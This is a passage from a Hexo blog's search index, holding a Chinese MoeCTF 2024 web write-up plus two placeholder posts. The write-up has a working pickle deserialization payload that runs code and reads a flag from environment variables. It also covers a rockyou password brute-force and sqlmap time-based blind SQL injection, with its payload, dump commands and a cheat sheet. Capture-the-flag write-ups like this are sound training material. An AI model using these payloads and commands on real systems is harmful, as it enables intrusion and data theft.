species=<span class="subst">&#123;self.species&#125;</span>, uuid=<span class="subst">&#123;self.uuid&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PetStore</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="variable language_">self</span>.pets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_pet</span>(<span class="params">self, name, species</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        pet = Pet(name, species)</span><br><span class="line">        <span class="variable language_">self</span>.pets.append(pet)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; Pet | <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> pet <span class="keyword">in</span> <span class="variable language_">self</span>.pets:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(pet.uuid) == pet_uuid:</span><br><span class="line">                <span class="keyword">return</span> pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">export_pet</span>(<span class="params">self, pet_uuid</span>) -&gt; <span class="built_in">str</span> | <span class="literal">None</span>:</span><br><span class="line">        pet = <span class="variable language_">self</span>.get_pet(pet_uuid)</span><br><span class="line">        <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="variable language_">self</span>.pets.remove(pet)</span><br><span class="line">            serialized_pet = base64.b64encode(pickle.dumps(pet)).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> serialized_pet</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">import_pet</span>(<span class="params">self, serialized_pet</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pet_data = base64.b64decode(serialized_pet)</span><br><span class="line">            pet = pickle.loads(pet_data)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(pet, Pet):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable language_">self</span>.pets:</span><br><span class="line">                    <span class="keyword">if</span> i.uuid == pet.uuid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="variable language_">self</span>.pets.append(pet)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">store = PetStore()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    pets = store.pets</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, pets=pets)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/create&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_pet</span>():</span><br><span class="line">    name = request.form[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">    species = request.form[<span class="string">&quot;species&quot;</span>]</span><br><span class="line">    store.create_pet(name, species)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/get&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    pet = store.get_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;name&quot;</span>: pet.name, <span class="string">&quot;species&quot;</span>: pet.species, <span class="string">&quot;uuid&quot;</span>: pet.uuid&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/export&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">export_pet</span>():</span><br><span class="line">    pet_uuid = request.form[<span class="string">&quot;uuid&quot;</span>]</span><br><span class="line">    serialized_pet = store.export_pet(pet_uuid)</span><br><span class="line">    <span class="keyword">if</span> serialized_pet <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;serialized_pet&quot;</span>: serialized_pet&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Pet not found&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/import&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">import_pet</span>():</span><br><span class="line">    serialized_pet = request.form[<span class="string">&quot;serialized_pet&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> store.import_pet(serialized_pet):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Failed to import pet&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8888</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>思路：import_pet接受一个被base64编码后的序列化对象，<strong>pickle序列化并不需要对象在环境中被定义</strong>，因此我们可以自定义一个类,用__reduce__方法，相当于php的__wakeup()都在反序列化的时候被触发，这样可以做到任意代码执行，但是由于无法通过isinstance的检查，所以看不到输出，我们因此可以利用create_pet来输出，因为所有被添加到列表的pet都会在网站顶部被展示，同时hint说flag在环境变量里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tmp</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;import os;store.create_pet(&#x27;rce&#x27;,os.getenv(&#x27;FLAG&#x27;));&quot;</span>,))</span><br><span class="line">s_data=base64.b64encode(pickle.dumps(tmp())).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s_data)</span><br></pre></td></tr></table></figure><p>![pet store](moectf2024-web方向wp&#x2F;pet store.png)</p><h2 id="smbms"><a href="#smbms" class="headerlink" title="smbms"></a><strong>smbms</strong></h2><p>hint提示：</p><p>放轻松，想要 sql 注入？PrepareStatement 是不会让你们轻易得逞的</p><p>登录不进去？看看我给的sql文件吧。虽然那些并不是真密码</p><p>sql里面虽然不是真密码，但是也是有意义的，要不翻译一下？</p><p>首先我们由此知道：sql注入不用试了。sql文件密码是假的；sql文件的密码隐藏了信息；</p><p>sql文件里有’weak_auth’</p><p>这些人的密码都是弱密码；</p><p>那就字典爆破一下，用rockyou.txt试看，放到burp的intruder里</p><p>爆出admin的密码为1234567</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/smbms3.png" alt="smbms3"></p><p>这里是查询员工的界面，连接到了数据库，可能存在sql注入点，用sqlmap试试看</p><p>sqlmap用法</p><p>python sqlmap.py -u URL 直接对某一个链接进行扫描，查看注入点；</p><p>python sqlmap.py -r request.txt sqlmap将使用用户自定义的请求进行扫描，查看注入点</p><p>然后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[09:50:17] [INFO] checking if the injection point on GET parameter &#x27;queryName&#x27; is a false positive</span><br><span class="line">GET parameter &#x27;queryName&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] y</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 205 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: queryName (GET)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: method=query&amp;queryName=12&#x27; AND (SELECT 7152 FROM (SELECT(SLEEP(5)))ENJY) AND &#x27;soIz&#x27;=&#x27;soIz</span><br><span class="line">---</span><br><span class="line">[09:51:00] [INFO] the back-end DBMS is MySQL</span><br><span class="line">[09:51:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span><br><span class="line">[09:51:00] [CRITICAL] connection was forcibly closed by the target URL. sqlmap is going to retry the request(s)</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] Y</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)</span><br><span class="line">[09:51:10] [INFO] fetched data logged to text files under &#x27;C:\Users\1\AppData\Local\sqlmap\output\192.168.119.1&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:51:10 /2024-10-13/</span><br></pre></td></tr></table></figure><p>发现注入点在queryName处，可以时间盲注，剩下的继续让sqlmap完成</p><p>python sqlmap.py -r get.txt –dbs 查看数据库</p><p>python sqlmap.py -r get.txt –current-db 这个直接查看当前数据库</p><p>然后确定数据库再指定数据库查看所有的表</p><p>python sqlmap.py -r get.txt -D smbms2 –tables</p><p>以此类推查看列</p><p>python sqlmap.py -r get.txt -D smbms2 -T flag –columns</p><p>python sqlmap.py -r get.txt -D smbms2 -T flag -C flag –dump</p><p>[10:04:11] [INFO] adjusting time delay to 2 seconds due to good response times<br><strong>moectf{r34DiNG_j@V@-5OUrcE-aND_lNJ3ct-sQqI-I5_BEaUt1Fu1ll0}</strong><br>Database: smbms2<br>Table: flag<br>[1 entry]<br>+————————————————————-+<br>| flag                                                        |<br>+————————————————————-+<br>| moectf{r34DiNG_j@V@-5OUrcE-aND_lNJ3ct-sQqI-I5_BEaUt1Fu1ll0} |<br>+————————————————————-+</p><p>总结一下sqlmap的基本用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-u 指定url扫描注入点</span><br><span class="line">-r 自定义请求扫描注入点</span><br><span class="line">--dbs 查看所有数据库</span><br><span class="line">--current-db 查看当前数据库</span><br><span class="line">--tables 查看所有表</span><br><span class="line">--colums 查看所有列</span><br><span class="line">--dump 查看表格内容</span><br><span class="line">-D 指定数据库</span><br><span class="line">-T 指定表格</span><br><span class="line">-C 指定列</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>this_is_a_test_blog</title>
      <link href="/2024/09/18/this-is-a-test-blog/"/>
      <url>/2024/09/18/this-is-a-test-blog/</url>
      
        <content type="html"><![CDATA[<p>hihihi，看到这里说明成功啦！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> test </tag>
            
            <tag> all </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/09/18/hello-world/"/>
      <url>/2024/09/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
